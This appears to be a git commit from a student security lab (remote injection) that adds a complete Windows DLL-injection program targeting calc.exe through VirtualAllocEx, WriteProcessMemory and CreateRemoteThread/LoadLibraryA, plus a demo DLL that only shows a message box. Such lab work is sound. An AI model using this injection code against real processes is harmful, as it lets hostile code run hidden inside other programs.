2022515239bb466befeedf83d84cb67e17fb17ba
TheMasterOfMagic <18811569079@163.com>
2019-03-31 16:55:02 +0800

    添加了第5次实验报告-远程注入部分

---
+++ 5/part1/Inject.cpp
@@ -0,0 +1,70 @@
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+
+int main() {
+	char szDllName[] = "C:\\MyDll.dll";
+
+	/* Step 1 */
+	PROCESSENTRY32 ProcessEntry = {};
+	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
+	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	bool bRet = Process32First(hProcessSnap, &ProcessEntry);
+	DWORD dwProcessId = 0;
+	while (bRet) {
+		if (strcmp("calc.exe", ProcessEntry.szExeFile) == 0) {
+			dwProcessId = ProcessEntry.th32ProcessID;
+			break;
+		}
+		bRet = Process32Next(hProcessSnap, &ProcessEntry);
+	}
+	if (0 == dwProcessId) {
+		printf("找不到进程\n");
+		return 1;
+	}
+
+	/* Step 2 */
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+	if (0 == hProcess) {
+		printf("无法打开进程\n");
+		return 1;
+	}
+
+	/* Step 3 */
+	size_t length = strlen(szDllName) + 1;
+	char * pszDllFile = (char *)VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_READWRITE);
+	if (0 == pszDllFile) {
+		printf("远程空间分配失败\n");
+		return 1;
+	}
+
+	/* Step 4 */
+	if (!WriteProcessMemory(hProcess, (PVOID)pszDllFile, (PVOID)szDllName, length, NULL)) {
+		printf("远程空间写入失败\n");
+		return 1;
+	}
+
+	/* Step 5 */
+	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
+	if (0 == pfnThreadRtn) {
+		printf("LoadLibraryA函数地址获取失败\n");
+		return 1;
+	}
+
+	/* Step 6 */
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, (PVOID)pszDllFile, 0, NULL);
+	if (0 == hThread) {
+		printf("远程线程创建失败\n");
+		return 1;
+	}
+
+	/* Step 7 */
+	WaitForSingleObject(hThread, INFINITE);
+	printf("远程线程执行完毕!\n");
+
+	VirtualFreeEx(hProcess, (PVOID)pszDllFile, 0, MEM_RELEASE);
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+
+	return 0;
+}
---
+++ 5/part1/MyDll.cpp
@@ -0,0 +1,10 @@
+﻿#include <windows.h>
+
+BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {
+	switch (dwReason) {
+	case DLL_PROCESS_ATTACH:
+		MessageBoxA(NULL, "\\(*￣v￣)/~Hi", "Hi Calculator", NULL);
+		break;
+	}
+	return TRUE;
+}
